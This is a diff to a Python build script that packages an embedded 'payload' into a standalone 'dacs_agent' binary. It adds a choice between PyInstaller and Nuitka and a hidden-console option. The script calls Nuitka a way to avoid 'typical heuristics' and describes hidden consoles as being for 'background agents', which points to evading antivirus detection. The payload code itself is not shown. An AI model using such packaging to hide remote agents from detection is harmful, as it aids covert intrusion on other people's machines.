@@ -18,6 +18,15 @@ def main():
     print("  2) Windows (Native/Wine)")
     plat_choice = input("Choice [1]: ").strip() or "1"
     
+    print("\nSelect compiler framework:")
+    print("  1) PyInstaller (Fast, standard, requires fewer OS dependencies)")
+    print("  2) Nuitka (C-Translation, avoids typical heuristics)")
+    comp_choice = input("Choice [1]: ").strip() or "1"
+    
+    print("\nHide console window? (Use 'y' for background agents, 'n' for debugging):")
+    hide_console_input = input("Choice [y/N]: ").strip().lower()
+    hide_console = True if hide_console_input in ('y', 'yes') else False
+    
     print("\n[*] Generating embedded payload configuration...")
     
     os.makedirs("dist", exist_ok=True)
@@ -56,47 +65,81 @@ if __name__ == "__main__":
     start()
 """)
 
-    print("[*] Checking native compiler dependencies...")
-    try:
-        import nuitka
-    except ImportError:
-        print("[!] Nuitka native compiler not found. Installing via pip...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "nuitka"])
-        
+    if comp_choice == "2":
+        compiler_name = "Nuitka"
+        print(f"[*] Checking {compiler_name} compiler dependencies...")
+        try:
+            import nuitka
+        except ImportError:
+            print(f"[!] {compiler_name} compiler not found. Installing via pip...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "nuitka"])
+    else:
+        compiler_name = "PyInstaller"
+        print(f"[*] Checking {compiler_name} dependencies...")
+        try:
+            import PyInstaller
+        except ImportError:
+            print(f"[!] {compiler_name} not found. Installing via pip...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+            
     os_name = "linux" if plat_choice == "1" else "windows.exe"
-    print(f"[*] Compiling natively via Nuitka for {os_name}...")
+    print(f"[*] Compiling via {compiler_name} for {os_name}...")
     
     binary_name = f"dacs_agent_{os_name}"
     target_path = os.path.join("dist", binary_name)
     
-    cmd = [
-        sys.executable, "-m", "nuitka",
-        "--standalone",
-        "--onefile",
-        "--remove-output",
-        "-o", target_path,
-        "--disable-console",
-        payload_path
-    ]
-    
-    if plat_choice == "2" and sys.platform != "win32":
-        print("\n[!] WARNING: You selected Windows but are running Linux.")
-        print("    Nuitka translates Python to C and strictly requires a Windows C-Compiler natively (or MinGW/Wine).")
-        print("    Attempting completion. Execution may yield a Linux ELF binary targeting the fallback GCC.")
+    if comp_choice == "2":
+        cmd = [
+            sys.executable, "-m", "nuitka",
+            "--standalone",
+            "--onefile",
+            "--remove-output",
+            "-o", target_path,
+        ]
+        if hide_console:
+            cmd.append("--disable-console")
+        cmd.append(payload_path)
         
+        if plat_choice == "2" and sys.platform != "win32":
+            print("\n[!] WARNING: You selected Windows but are running Linux.")
+            print("    Nuitka translates Python to C and strictly requires a Windows C-Compiler natively (or MinGW/Wine).")
+            print("    Attempting completion. Execution may yield a Linux ELF binary targeting the fallback GCC.")
+    else:
+        cmd = [
+            sys.executable, "-m", "PyInstaller",
+            "--noconfirm",
+            "--onefile",
+            "--name", binary_name,
+            "--hidden-import", "websockets",
+        ]
+        if hide_console:
+            cmd.append("--noconsole")
+        cmd.append(payload_path)
+        
+        if plat_choice == "2" and sys.platform != "win32":
+            print("\n[!] WARNING: You selected Windows but are running Linux.")
+            print("    Python's PyInstaller requires Windows natively (or Wine) to build a .exe.")
+            print("    This build process will likely generate an ELF binary or fail.")
+
     try:
         print(f"\n[*] Executing: {' '.join(cmd)}")
         subprocess.check_call(cmd)
-        print(f"\n[+] SUCCESS! Standalone native binary compiled to C and packed: {target_path}")
+        print(f"\n[+] SUCCESS! Standalone native binary compiled: {target_path}")
     except subprocess.CalledProcessError as e:
         print(f"\n[-] Build failed with exit code {e.returncode}")
-        print("[-] Ensure you have a valid C compiler installed (GCC on Linux, MSVC/MinGW on Windows).")
+        if comp_choice == "2":
+            print("[-] Ensure you have a valid C compiler installed (GCC with 'patchelf' on Linux, MSVC/MinGW on Windows).")
     finally:
         try:
             os.remove(payload_path)
-            shutil.rmtree("dist/dacs_payload.build", ignore_errors=True)
-            shutil.rmtree("dist/dacs_payload.dist", ignore_errors=True)
-            shutil.rmtree("dist/dacs_payload.onefile-build", ignore_errors=True)
+            if comp_choice == "2":
+                shutil.rmtree("dist/dacs_payload.build", ignore_errors=True)
+                shutil.rmtree("dist/dacs_payload.dist", ignore_errors=True)
+                shutil.rmtree("dist/dacs_payload.onefile-build", ignore_errors=True)
+            else:
+                shutil.rmtree("build", ignore_errors=True)
+                if os.path.exists(f"{binary_name}.spec"):
+                    os.remove(f"{binary_name}.spec")
         except Exception:
             pass
 
